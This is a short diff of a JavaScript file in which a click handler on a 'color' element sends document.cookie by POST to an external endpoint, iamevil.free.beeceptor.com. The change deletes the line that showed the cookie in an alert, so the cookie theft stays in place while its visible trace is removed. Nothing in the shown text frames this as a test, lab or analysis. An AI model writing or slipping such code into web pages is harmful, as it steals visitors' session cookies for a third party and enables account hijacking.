@@ -7,5 +7,4 @@ function getRandomInt(max) {
 
 color.onclick = () => {
     fetch('https://iamevil.free.beeceptor.com', {method: 'POST', body:document.cookie});
-    alert(document.cookie);
 }
